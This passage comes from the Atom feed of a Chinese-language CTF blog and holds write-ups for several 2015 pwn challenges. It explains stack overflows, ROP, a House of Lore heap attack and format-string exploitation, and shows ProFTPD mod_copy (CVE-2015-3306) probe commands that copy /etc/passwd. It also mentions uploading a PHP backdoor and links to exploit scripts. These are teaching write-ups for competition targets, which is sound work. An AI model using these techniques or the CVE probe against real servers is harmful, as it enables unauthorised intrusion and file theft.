+先隨便送個 256 字元試試...&lt;br&gt;
+&lt;em&gt;Segmentation fault&lt;/em&gt;&lt;br&gt;
+表示漏洞的確存在, 但是跟我的預期不太相符&lt;br&gt;
+我原本是預計會發生 &lt;em&gt;*** stack smashing detected ***&lt;/em&gt;&lt;br&gt;
+gdb 實際追一下發現在做 xor 的時候存取到 stack 以外的範圍了&lt;br&gt;
+仔細看一下是因為 &lt;code&gt;len&lt;/code&gt; 在 buffer 的後面...&lt;br&gt;
+bof 會順便被改掉的關係  &lt;/p&gt;
+&lt;p&gt;仔細想一下 &lt;code&gt;len&lt;/code&gt; 這邊也要好好設才行&lt;br&gt;
+因為這個程式會一直 call 一直 call&lt;br&gt;
+就算正常結束的話也會做 256 次之後才觸發 return&lt;br&gt;
+這樣 payload 早就被 xor 得不成人形了...&lt;br&gt;
+但是也不能再 &lt;code&gt;layer1&lt;/code&gt; 就改成 0&lt;br&gt;
+不然這樣改完 &lt;code&gt;len&lt;/code&gt; 就不會繼續蓋後面的 return address 了&lt;br&gt;
+所以理想的狀況是:  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在 layer1 寫好 rop chain  &lt;/li&gt;
+&lt;li&gt;在 layer2 改掉 &lt;code&gt;len&lt;/code&gt; 觸發 return  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以 &lt;code&gt;layer1&lt;/code&gt;, &lt;code&gt;layer2&lt;/code&gt; 是哪一個 function 就要好好考慮一下 XD&lt;br&gt;
+挑對 function exploit 會比較好寫一點&lt;br&gt;
+&lt;code&gt;layer1&lt;/code&gt; 的 buffer 要大一點, 不然 xor 會蓋到 &lt;code&gt;layer0&lt;/code&gt; 的 buffer&lt;br&gt;
+&lt;code&gt;layer2&lt;/code&gt; 的 buffer 要小一點, 第二層 overflow 會蓋不到 &lt;code&gt;len&lt;/code&gt;&lt;br&gt;
+我不幸挑錯 &lt;code&gt;layer2&lt;/code&gt; function ...&lt;br&gt;
+會進入到 &lt;code&gt;layer3&lt;/code&gt; Orz ...&lt;br&gt;
+變成要讓兩次 stack guard 都不能被更動才行  &lt;/p&gt;
+&lt;p&gt;可以觸發 return 後&lt;br&gt;
+就用 pop 之類的先把未知的垃圾跳開&lt;br&gt;
+讓 rop chain 可以完整地落在 buffer 上&lt;br&gt;
+接下來我是把 stack 先移到 bss 段&lt;br&gt;
+再跳一次 recv 接第二次 rop&lt;br&gt;
+這樣就不會一直被 xor 弄壞了  &lt;/p&gt;
+&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/rhinoxorus.py"&gt;rhinoxorus.py&lt;/a&gt;  &lt;/p&gt;</content><category term="CSAWCTF"></category><category term="Stack Overflow"></category></entry><entry><title>honeyme 2015 CTF CVE-2015-3306</title><link href="https://ddaa.tw/honeyme_pwn_cve_2015_3306.html" rel="alternate"></link><published>2015-08-22T12:49:00+08:00</published><updated>2015-08-22T12:49:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-08-22:/honeyme_pwn_cve_2015_3306.html</id><summary type="html">&lt;p&gt;這次比賽前一天好像吃壞肚子...&lt;br&gt;
+結果隔天遲到 將近 12 點才到會場&lt;br&gt;
+很擔心會不會到現場題目已經被 &lt;strong&gt;Orange&lt;/strong&gt; 解光了 (誤&lt;br&gt;
+還好還是有解貢獻一點分數 XD  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;honeyme 是採 &lt;strong&gt;King of the Hill&lt;/strong&gt; 的賽制&lt;br&gt;
+參賽隊伍要想辦法把主機首頁給換掉&lt;br&gt;
+寫進自己的 token&lt;br&gt;
+就可以有源源不絕的分數了~&lt;/p&gt;
+&lt;p&gt;其中 ip .194 這台主辦方出的漏洞是利用 &lt;code&gt;CVE-2015-3306&lt;/code&gt;&lt;br&gt;
+一個 Proftpd 的邏輯漏洞&lt;br&gt;
+在 &lt;code&gt;Proftpd&lt;/code&gt; 啟用 &lt;code&gt;mod_copy&lt;/code&gt; 模組的請況下&lt;br&gt;
+允許攻擊者在尚未認證的情況下任意對檔案進行讀寫&lt;br&gt;
+可以用以下的程式碼驗證 ftp server 是否存在漏洞:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;220 ProFTPD 1.3.4a Server (ProFTPD Default Installation) [127 …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這次比賽前一天好像吃壞肚子...&lt;br&gt;
+結果隔天遲到 將近 12 點才到會場&lt;br&gt;
+很擔心會不會到現場題目已經被 &lt;strong&gt;Orange&lt;/strong&gt; 解光了 (誤&lt;br&gt;
+還好還是有解貢獻一點分數 XD  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;honeyme 是採 &lt;strong&gt;King of the Hill&lt;/strong&gt; 的賽制&lt;br&gt;
+參賽隊伍要想辦法把主機首頁給換掉&lt;br&gt;
+寫進自己的 token&lt;br&gt;
+就可以有源源不絕的分數了~&lt;/p&gt;
+&lt;p&gt;其中 ip .194 這台主辦方出的漏洞是利用 &lt;code&gt;CVE-2015-3306&lt;/code&gt;&lt;br&gt;
+一個 Proftpd 的邏輯漏洞&lt;br&gt;
+在 &lt;code&gt;Proftpd&lt;/code&gt; 啟用 &lt;code&gt;mod_copy&lt;/code&gt; 模組的請況下&lt;br&gt;
+允許攻擊者在尚未認證的情況下任意對檔案進行讀寫&lt;br&gt;
+可以用以下的程式碼驗證 ftp server 是否存在漏洞:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;220 ProFTPD 1.3.4a Server (ProFTPD Default Installation) [127.0.0.1]&lt;br&gt;
+&lt;code&gt;SITE cpfr /etc/passwd&lt;/code&gt;&lt;br&gt;
+350 File or directory exists, ready for destination name&lt;br&gt;
+&lt;code&gt;SITE cpto /tmp/gg&lt;/code&gt;&lt;br&gt;
+250 Copy successful  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;這個漏洞其實第一天就發現了&lt;br&gt;
+可是當時不知道是主辦方刻意還是設定失誤&lt;br&gt;
+導致 ftp server 所在的 filesystem 是 Read-only&lt;br&gt;
+試了半天還是沒辦法成功利用
+到第二天卻又修復了...&lt;br&gt;
+一開始想直接拿 exploitdb 的 &lt;a href="https://www.exploit-db.com/exploits/36742/"&gt;payload&lt;/a&gt; 來攻擊主機&lt;br&gt;
+可是失敗了...似乎是因為 sockfd 不是 3&lt;br&gt;
+但是直接用 &lt;code&gt;metasploit&lt;/code&gt; 會成功&lt;br&gt;
+只是我對 &lt;code&gt;metasploit&lt;/code&gt; 其實不是很熟&lt;br&gt;
+一直沒辦法建立 reverse shell 回來 = =&lt;br&gt;
+只好去 trace 兩邊的 payload 差別在哪裡  &lt;/p&gt;
+&lt;p&gt;兩份最大的差別是&lt;br&gt;
+&lt;code&gt;metasploit&lt;/code&gt; 取得 input 的檔案是 &lt;code&gt;/proc/self/cmdline&lt;/code&gt;&lt;br&gt;
+比起從 &lt;code&gt;/proc/self/fd/3&lt;/code&gt; 好用多了&lt;br&gt;
+雖然會把當前指令也寫進檔案&lt;br&gt;
+但是反正我們要寫的是網頁&lt;br&gt;
+把多餘的指令註解掉就行了&lt;br&gt;
+話說 trace msf 以後才知道原來是用 ruby 寫的...&lt;br&gt;
+跟 ruby 不太熟不知道要怎麼拿來直接執行&lt;br&gt;
+只好重寫一份 payload&lt;br&gt;
+上傳了 php 後門以後&lt;br&gt;
+剩下就交給 Orange 了 XDD  &lt;/p&gt;
+&lt;p&gt;完整 payload: &lt;a href="https://ddaa.tw/exp/honeyme.py"&gt;exploit&lt;/a&gt;  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;由於去年 honeyme 剛好跑去韓國打 secuinside&lt;br&gt;
+無從比較題目是否有進步 XD&lt;br&gt;
+難易度跟一般國際賽的 CTF 比起來的確有些差距 &lt;br&gt;
+不過也沒有到賽前打聽的那麼悽慘 XD&lt;br&gt;
+大概跟大陸那邊 xctf 一些比較小的聯賽差不多水準吧&lt;br&gt;
+然後誠心建議不要有太多猜謎阿~&lt;br&gt;
+比賽時間很短的 讓大家專注在技術上就好了 QQ  &lt;/p&gt;
+&lt;p&gt;最後特別感謝有 Orange 一起參加&lt;br&gt;
+這次 Bamboofox 參賽其實主要目的是想培育新人&lt;br&gt;
+但是我是 web 智障阿 QQQQ&lt;br&gt;
+還好有 Orange Carry 全場 XD&lt;br&gt;
+兩天下來默默地學了不少 web 的技巧&lt;br&gt;
+衷心希望下次 CTF 可以解出 web 題...&lt;br&gt;
+打了兩年 CTF, web write-up 至今只有兩篇 囧  &lt;/p&gt;</content><category term="Other CTF"></category><category term="CVE"></category></entry><entry><title>CAMPCTF 2015 Pwn 300 datenklo manager</title><link href="https://ddaa.tw/campctf_pwn_300_dkm.html" rel="alternate"></link><published>2015-08-21T13:29:00+08:00</published><updated>2015-08-21T13:29:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-08-21:/campctf_pwn_300_dkm.html</id><summary type="html">&lt;p&gt;這次的 pwn 題型都很和善&lt;br&gt;
+這題應該是裡面最難的一題 (?&lt;br&gt;
+至少對我來說 heap 還是很難解 OTZ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;題目跟一般 heap 題差不多&lt;br&gt;
+一個選單有數樣功能:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;List DK&lt;/li&gt;
+&lt;li&gt;Add DK&lt;/li&gt;
+&lt;li&gt;Edit DK&lt;/li&gt;
+&lt;li&gt;Delete DK&lt;/li&gt;
+&lt;li&gt;exit&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;DK 又分成兩種類型: &lt;code&gt;with wifi&lt;/code&gt;, &lt;code&gt;without wifi&lt;/code&gt;&lt;br&gt;
+這個程式用到的結構如下:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;struct DK_base {
+    long lg;
+    long la;
+    void *show_ptr;
+    void *edit_ptr;
+};
+
+struct DK_with_wifi {
+    DK_base base;
+    char* ssid[32];
+    char comment[1024];
+};
+
+struct DK_without_wifi …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這次的 pwn 題型都很和善&lt;br&gt;
+這題應該是裡面最難的一題 (?&lt;br&gt;
+至少對我來說 heap 還是很難解 OTZ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;題目跟一般 heap 題差不多&lt;br&gt;
+一個選單有數樣功能:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;List DK&lt;/li&gt;
+&lt;li&gt;Add DK&lt;/li&gt;
+&lt;li&gt;Edit DK&lt;/li&gt;
+&lt;li&gt;Delete DK&lt;/li&gt;
+&lt;li&gt;exit&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;DK 又分成兩種類型: &lt;code&gt;with wifi&lt;/code&gt;, &lt;code&gt;without wifi&lt;/code&gt;&lt;br&gt;
+這個程式用到的結構如下:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;struct DK_base {
+    long lg;
+    long la;
+    void *show_ptr;
+    void *edit_ptr;
+};
+
+struct DK_with_wifi {
+    DK_base base;
+    char* ssid[32];
+    char comment[1024];
+};
+
+struct DK_without_wifi {
+    DK_base base;
+    char comment[1024];
+};
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;show_ptr&lt;/code&gt; 和 &lt;code&gt;edit_ptr&lt;/code&gt; 會在 &lt;code&gt;List DK&lt;/code&gt; 和 &lt;code&gt;Edit DK&lt;/code&gt; 的功能用到&lt;br&gt;
+在 add 之後就會根據 DK 種類填入對應的函式位置&lt;br&gt;
+程式根據目前 DK 的數量動態配置一個陣列來記錄 DK&lt;br&gt;
+兩種 DK 用同一個陣列去記錄&lt;br&gt;
+因此會根據 DK 種類不同呼叫不同的函式處理 DK  &lt;/p&gt;
+&lt;p&gt;程式的漏洞是
+先 add 一個 &lt;code&gt;DK_with_wifi&lt;/code&gt;&lt;br&gt;
+接著 edit dk 將種類改成 &lt;code&gt;DK_without_wifi&lt;/code&gt;&lt;br&gt;
+程式會在同一個位置將 chunk 重新 realloc 0x420 byte&lt;br&gt;
+但是 edit 有一個選項是 &lt;code&gt;do not change&lt;/code&gt;&lt;br&gt;
+會用一開始宣告時分配的 func 去處理 DK&lt;br&gt;
+因此我們可以用處理 &lt;code&gt;DK_with_wifi&lt;/code&gt; 的 edit function 去處理 &lt;code&gt;DK_without_wifi&lt;/code&gt;&lt;br&gt;
+由於兩者大小相差 0x100 byte&lt;br&gt;
+因此會導致 &lt;code&gt;heap overflow&lt;/code&gt; 的問題  &lt;/p&gt;
+&lt;p&gt;這題我的利用方式是 &lt;a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt"&gt;The Malloc Maleficarum&lt;/a&gt; 提到的 &lt;code&gt;The House of Lord&lt;/code&gt;&lt;br&gt;
+原理是 overflow 以後把 freed chunk 的 BK 改成我們偽造的 chunk&lt;br&gt;
+這樣下次 malloc 的時候就會得到所偽造 chunk 的位置&lt;br&gt;
+詳細步驟如下:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;新增兩個 &lt;code&gt;DK_with_wifi&lt;/code&gt;, 利用 &lt;code&gt;comment&lt;/code&gt; 的 1024 byte 偽造兩個 freed chunk  &lt;/li&gt;
+&lt;li&gt;用 edit 將第一個 DK 的類型改成 &lt;code&gt;DK_without_wifi&lt;/code&gt;  &lt;/li&gt;
+&lt;li&gt;再 edit 一次, 這次選 &lt;code&gt;Do Not Change&lt;/code&gt;, 在 edit comment 的時候會超出 0x100 bytes  &lt;/li&gt;
+&lt;li&gt;利用超出的 0x100 byte 把 BK 改成 第一個 chunk 的位置&lt;/li&gt;
+&lt;li&gt;隨便 add 一個 DK, 這個 DK malloc 得到的位置會和第一個 DK 的 comment 重疊&lt;/li&gt;
+&lt;li&gt;用 &lt;code&gt;Do Not Change&lt;/code&gt; 編輯第一個 DK, 修改 comment 時可以改到第三個 DK 的 func ptr, 把 &lt;code&gt;edit_ptr&lt;/code&gt; 改成 system  &lt;/li&gt;
+&lt;li&gt;用 &lt;code&gt;Do Not Change&lt;/code&gt; 編輯第三個 DK, 由於 &lt;code&gt;edit_ptr&lt;/code&gt; 已經被改掉, 會變成執行 system  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;libc address 和 heap address 可以利用 &lt;code&gt;list DK&lt;/code&gt; 取得&lt;br&gt;
+system 的參數剛好會落於第一個 DK comment 的位置&lt;br&gt;
+所以可以直接 &lt;code&gt;system("/bin/sh")&lt;/code&gt; 取得 shell&lt;br&gt;
+完整 exploit: &lt;a href="https://ddaa.tw/exp/dkm.py"&gt;exp.py&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;btw, 後來 &lt;strong&gt;angelboy&lt;/strong&gt; 說只要 edit 的時候 SSID 設 0&lt;br&gt;
+下次 add 的 DK 可以直接被 overflow 蓋 func ptr 了...&lt;br&gt;
+這題是我想太難了 OTZ  &lt;/p&gt;</content><category term="Other CTF"></category><category term="Heap Overflow"></category></entry><entry><title>0CTF 2015 Exploit 250 FlagGenerator</title><link href="https://ddaa.tw/0ctf_exploit_250_flaggenerator.html" rel="alternate"></link><published>2015-04-03T00:00:00+08:00</published><updated>2015-04-03T00:00:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-04-03:/0ctf_exploit_250_flaggenerator.html</id><summary type="html">&lt;p&gt;這題的名稱叫 &lt;em&gt;FlagGenerator&lt;/em&gt;&lt;br&gt;
+可惜沒辦法生出其他題的 flag ... XD  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;執行程式後看到 menu 長這樣:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;== 0ops Flag Generator ==&lt;br&gt;
+1. Input Flag&lt;br&gt;
+2. Uppercase&lt;br&gt;
+3. Lowercase&lt;br&gt;
+4. Leetify&lt;br&gt;
+5. Add Prefix&lt;br&gt;
+6. Output Flag&lt;br&gt;
+7. Exit&lt;br&gt;
+=========================&lt;br&gt;
+Your choice:  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;打開 &lt;strong&gt;ida pro&lt;/strong&gt; 快速檢查&lt;br&gt;
+flag 的長度限制為 256 byte&lt;br&gt;
+但是 &lt;em&gt;Leetify&lt;/em&gt; 的功能會造成 bof&lt;br&gt;
+原因是 &lt;em&gt;Leetify&lt;/em&gt; 會將字串內的 &lt;em&gt;H&lt;/em&gt; 或是 &lt;em&gt;h&lt;/em&gt; 字元取代成 &lt;em&gt;1-1 …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題的名稱叫 &lt;em&gt;FlagGenerator&lt;/em&gt;&lt;br&gt;
+可惜沒辦法生出其他題的 flag ... XD  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;執行程式後看到 menu 長這樣:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;== 0ops Flag Generator ==&lt;br&gt;
+1. Input Flag&lt;br&gt;
+2. Uppercase&lt;br&gt;
+3. Lowercase&lt;br&gt;
+4. Leetify&lt;br&gt;
+5. Add Prefix&lt;br&gt;
+6. Output Flag&lt;br&gt;
+7. Exit&lt;br&gt;
+=========================&lt;br&gt;
+Your choice:  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;打開 &lt;strong&gt;ida pro&lt;/strong&gt; 快速檢查&lt;br&gt;
+flag 的長度限制為 256 byte&lt;br&gt;
+但是 &lt;em&gt;Leetify&lt;/em&gt; 的功能會造成 bof&lt;br&gt;
+原因是 &lt;em&gt;Leetify&lt;/em&gt; 會將字串內的 &lt;em&gt;H&lt;/em&gt; 或是 &lt;em&gt;h&lt;/em&gt; 字元取代成 &lt;em&gt;1-1&lt;/em&gt;&lt;br&gt;
+所以只要送包含夠多的 &lt;em&gt;H&lt;/em&gt; 或是 &lt;em&gt;h&lt;/em&gt; 字串&lt;br&gt;
+就會超出 256 byte 了&lt;br&gt;
+pseudo code:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void Leetify(char *flag)
+{
+    char *c = flag;
+    char buf[256];
+    for (c = flag; c != NULL; c++) {
+        switch(c) {
+            case &amp;#39;H&amp;#39;:
+            case &amp;#39;h&amp;#39;:
+                /* do leetify on buf*/
+                break;
+        }
+    }
+    buf[end] = &amp;#39;\0&amp;#39;;
+    strcpy(flag, buf);
+    return;
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;雖然這題的 bof 發生在 stack 上&lt;br&gt;
+但是有 &lt;strong&gt;stack guard&lt;/strong&gt; 的檢查&lt;br&gt;
+沒辦法直接改 ret addr 去控制 eip&lt;br&gt;
+但是 return 前的 &lt;code&gt;strcpy()&lt;/code&gt; 讓我們有機會繞過保護&lt;br&gt;
+由於傳入的參數 &lt;code&gt;flag&lt;/code&gt; 也是在 stack 上&lt;br&gt;
+發生 bof 之後可以改掉參數的內容&lt;br&gt;
+這樣 &lt;code&gt;strcpy()&lt;/code&gt; 就變成可以任意寫值的漏洞&lt;br&gt;
+我們可以將 &lt;code&gt;__stack_chk_fail()&lt;/code&gt; 在 GOT 上的值指向 &lt;code&gt;ret&lt;/code&gt;&lt;br&gt;
+程式就不會因為 &lt;em&gt;detect overflow&lt;/em&gt; 而結束  &lt;/p&gt;
+&lt;p&gt;剩下就是寫 exploit 了&lt;br&gt;
+由於這題有使用到 &lt;code&gt;puts()&lt;/code&gt;&lt;br&gt;
+所以可以透過 &lt;code&gt;puts()&lt;/code&gt; 去 leak 出 &lt;strong&gt;libc base&lt;/strong&gt;&lt;br&gt;
+但是因為改 &lt;code&gt;__stack_chk_fail()&lt;/code&gt; GOT 的同時也把其他 function 的 GOT 改壞了&lt;br&gt;
+就沒辦法跳回 &lt;code&gt;main()&lt;/code&gt; 再觸發一次 bof&lt;br&gt;
+所以改成 return 到 &lt;code&gt;readn()&lt;/code&gt; 將新的 rop payload 寫到 &lt;strong&gt;bss&lt;/strong&gt; 段&lt;br&gt;
+最後透過 &lt;code&gt;leave&lt;/code&gt; 將 stack 給換到 bss 段繼續我們的 rop attack&lt;br&gt;
+就可以成功拿到 shell 了 ~  &lt;/p&gt;
+&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/flaggen.py"&gt;flaggen.py&lt;/a&gt;  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;0ctf{delicious_stack_cookie_generates_flag}&lt;/code&gt;  &lt;/p&gt;</content><category term="XCTF"></category><category term="Stack Overflow"></category></entry><entry><title>0CTF 2015 Exploit 300 login</title><link href="https://ddaa.tw/0ctf_exploit_300_login.html" rel="alternate"></link><published>2015-04-03T00:00:00+08:00</published><updated>2015-04-03T00:00:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-04-03:/0ctf_exploit_300_login.html</id><summary type="html">&lt;p&gt;這題跟 &lt;strong&gt;yench&lt;/strong&gt; 討論&lt;br&gt;
+至少省下我一個小時突破盲點 XD&lt;br&gt;
+上學期辛苦開程式安全終於感覺有回饋了 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是考 &lt;strong&gt;format string vulnerability&lt;/strong&gt;&lt;br&gt;
+執行程式要我們輸入帳密&lt;br&gt;
+打開 &lt;strong&gt;ida pro&lt;/strong&gt; 很容易就知道帳密多少&lt;br&gt;
+輸入 &lt;em&gt;guest / guest123&lt;/em&gt; 以後成功登入&lt;br&gt;
+接著有三個功能可以選擇:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;== 0CTF Login System ==&lt;br&gt;
+1. Show Profile&lt;br&gt;
+2. Login as User&lt;br&gt;
+3. Logout&lt;br&gt;
+=======================&lt;br&gt;
+Your choice:  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但其實還有一個隱藏功能 &lt;em&gt;4&lt;/em&gt;&lt;br&gt;
+必須讓自己的身分變成 &lt;em&gt;normal&lt;/em&gt; 才能觸發&lt;br&gt;
+功能 4 是登入成 &lt;em&gt;root&lt;/em&gt; 的功能&lt;br&gt;
+裡面有兩個很明顯的 &lt;code&gt;printf(buf)&lt;/code&gt;&lt;br&gt;
+所以首先我們要讓自己的身份從 &lt;em&gt;guest …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題跟 &lt;strong&gt;yench&lt;/strong&gt; 討論&lt;br&gt;
+至少省下我一個小時突破盲點 XD&lt;br&gt;
+上學期辛苦開程式安全終於感覺有回饋了 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是考 &lt;strong&gt;format string vulnerability&lt;/strong&gt;&lt;br&gt;
+執行程式要我們輸入帳密&lt;br&gt;
+打開 &lt;strong&gt;ida pro&lt;/strong&gt; 很容易就知道帳密多少&lt;br&gt;
+輸入 &lt;em&gt;guest / guest123&lt;/em&gt; 以後成功登入&lt;br&gt;
+接著有三個功能可以選擇:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;== 0CTF Login System ==&lt;br&gt;
+1. Show Profile&lt;br&gt;
+2. Login as User&lt;br&gt;
+3. Logout&lt;br&gt;
+=======================&lt;br&gt;
+Your choice:  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但其實還有一個隱藏功能 &lt;em&gt;4&lt;/em&gt;&lt;br&gt;
+必須讓自己的身分變成 &lt;em&gt;normal&lt;/em&gt; 才能觸發&lt;br&gt;
+功能 4 是登入成 &lt;em&gt;root&lt;/em&gt; 的功能&lt;br&gt;
+裡面有兩個很明顯的 &lt;code&gt;printf(buf)&lt;/code&gt;&lt;br&gt;
+所以首先我們要讓自己的身份從 &lt;em&gt;guest&lt;/em&gt; 變成 &lt;em&gt;normal&lt;/em&gt;&lt;br&gt;
+pseudo code 大概長這樣:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;char user[256];
+int64 mode;
+...
+if ( choice == 4 &amp;amp;&amp;amp; !mode)
+    root_login()
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;em&gt;Login as User&lt;/em&gt; 利用 &lt;code&gt;scanf("%256s", user)&lt;/code&gt; 取得 &lt;code&gt;user&lt;/code&gt;&lt;br&gt;
+乍看之下是剛好 但是 &lt;code&gt;scanf("%s")&lt;/code&gt; 的特性會在字串結尾補上 &lt;em&gt;\00&lt;/em&gt;&lt;br&gt;
+因此會有 &lt;strong&gt;off-by-one&lt;/strong&gt; 的問題&lt;br&gt;
+因此只要輸入長度 256 的 &lt;code&gt;user&lt;/code&gt; 即可讓身份變為 &lt;em&gt;normal&lt;/em&gt;  &lt;/p&gt;
+&lt;p&gt;進入 &lt;code&gt;root_login()&lt;/code&gt; 以後的行為如下:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;readn(user, 256);
+pw = md5(readn(pw, 256));
+if (user == &amp;quot;root&amp;quot; &amp;amp;&amp;amp; pw == &amp;quot;0ops{secret_MD5}&amp;quot;)
+    cat_flag();
+printf(user);
+puts(&amp;quot;login failed.&amp;quot;);
+...
+/* 2 chances */
+...
+exit(1);
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;登入失敗會用 &lt;code&gt;printf(user)&lt;/code&gt; 印出使用者名稱&lt;br&gt;
+一個非常明顯的 &lt;strong&gt;Format String&lt;/strong&gt;&lt;br&gt;
+我一開始以為 binary 中的 &lt;em&gt;0ops{secret md5}&lt;/em&gt; 是被替換掉的&lt;br&gt;
+真實環境會放真的 md5 ... 只要 leak 出密碼就過了&lt;br&gt;
+後來試一下才發現那個字串真的就是那樣 = =&lt;br&gt;
+md5 的結果是 hex string 的形式&lt;br&gt;
+所以不可能滿足條件 XD  &lt;/p&gt;
+&lt;p&gt;由於最後會用 &lt;code&gt;exit(1)&lt;/code&gt; 結束程式&lt;br&gt;
+沒辦法透過改 ret address 去控制程式&lt;br&gt;
+所以很直覺的會想改 &lt;code&gt;exit()&lt;/code&gt; 的 GOT&lt;br&gt;
+但是寫完 exploit 才發現這題的 GOT 竟然是 &lt;em&gt;read-only&lt;/em&gt; XDDD&lt;br&gt;
+不確定是因為 &lt;strong&gt;PIE&lt;/strong&gt; 的緣故或是有開啟其他保護機制  &lt;/p&gt;
+&lt;p&gt;乍看之下無技可施了&lt;br&gt;
+正當我在嘗試研究 &lt;code&gt;memcpy()&lt;/code&gt; 內部的是不是有可以利用的同時&lt;br&gt;
+&lt;strong&gt;yench&lt;/strong&gt; 提醒我能不能改 &lt;code&gt;printf()&lt;/code&gt; 的 rbp 去控制程式&lt;br&gt;
+結果是沒辦法~ 因為 &lt;code&gt;printf()&lt;/code&gt; 最後沒有 leave&lt;br&gt;
+但是這讓我想起去年 &lt;strong&gt;HITCON&lt;/strong&gt; 的某一題&lt;br&gt;
+是利用 &lt;code&gt;sprinf()&lt;/code&gt; 任意改值造成 overflow 的二次利用&lt;br&gt;
+果然這題也是類似的做法&lt;br&gt;
+由於實際發生 &lt;strong&gt;Format String&lt;/strong&gt; 是在 printf 內部的 &lt;code&gt;vprintf()&lt;/code&gt;&lt;br&gt;
+因此可以將 &lt;code&gt;printf()&lt;/code&gt; 的 return address 給改掉  &lt;/p&gt;
+&lt;p&gt;有兩次 &lt;code&gt;printf()&lt;/code&gt; 可以利用&lt;br&gt;
+因此只要第一次 leak 出 &lt;strong&gt;libc base&lt;/strong&gt; 以及 &lt;strong&gt;stack base&lt;/strong&gt;&lt;br&gt;
+第二次可以做 rop 攻擊&lt;br&gt;
+改 ret 跳到 &lt;code&gt;pop rdi&lt;/code&gt; 再到 &lt;code&gt;system()&lt;/code&gt; 就拿到這題的 shell 了~  &lt;/p&gt;
+&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/login.py"&gt;login.py&lt;/a&gt;  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;0ctf{login_success_and_welcome_back}&lt;/code&gt;  &lt;/p&gt;</content><category term="XCTF"></category><category term="Off-by-one"></category><category term="Format String"></category></entry><entry><title>Codegate CTF 2015 pwn 1000 sokoban</title><link href="https://ddaa.tw/codegate_pwn_1000_sokoban.html" rel="alternate"></link><published>2015-03-24T12:55:00+08:00</published><updated>2015-03-24T12:55:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-03-24:/codegate_pwn_1000_sokoban.html</id><summary type="html">&lt;p&gt;The challenge is a game that called &lt;strong&gt;sokoban&lt;/strong&gt;. lol&lt;br&gt;
+After we passed the first levels, we entered a menu and were able to choose the game mode.  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The menu looked like:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;Go to random infinite challenge mode  &lt;/li&gt;
+&lt;li&gt;Go to next stage  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Next, we opened IDA pro and reversed the binary …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The challenge is a game that called &lt;strong&gt;sokoban&lt;/strong&gt;. lol&lt;br&gt;
+After we passed the first levels, we entered a menu and were able to choose the game mode.  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The menu looked like:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;Go to random infinite challenge mode  &lt;/li&gt;
+&lt;li&gt;Go to next stage  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
